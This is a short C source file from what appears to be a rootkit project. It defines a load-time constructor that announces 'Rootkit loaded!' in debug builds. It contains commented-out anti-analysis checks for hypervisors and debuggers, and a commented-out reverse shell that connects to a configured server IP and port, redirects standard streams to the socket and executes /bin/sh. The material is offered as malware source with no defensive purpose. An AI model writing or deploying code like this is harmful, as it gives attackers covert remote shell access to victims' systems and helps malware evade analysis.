/*
 * Copyright (C) 2022 0x80000000
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include "rkit.h"
#include "config.h"


/*
    *    src/rkit.c
    *    Date: 03/30/22
    *    Author: 0x80000000
*/


void __attribute__((constructor)) vm_check(void) {
#ifdef DEBUG
  rkit_log("Rootkit loaded!\n");
#endif
  //if (DetectHypervisors() || ptrace_detection())
    //exit(EXIT_FAILURE);

/*
  int32_t fd;
  struct sockaddr_in server;
  uint8_t buffer[BUFSIZ] = {0};

  server.sin_family = AF_INET;
  server.sin_addr.s_addr = inet_addr(SERVER_IP);
  server.sin_port = htons(SERVER_PORT);

  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    exit(EXIT_FAILURE);

  if (connect(fd, (struct sockaddr *)&server, sizeof(server)) == -1)
    exit(EXIT_FAILURE);

#ifdef DEBUG
  rkit_log("Connected to [%s]!\n", SERVER_IP);
#endif

  for (int32_t i = 0; i < 3; i++)
    dup(fd, i);

  execve("/bin/sh", NULL, NULL);
  close(fd);
  */
}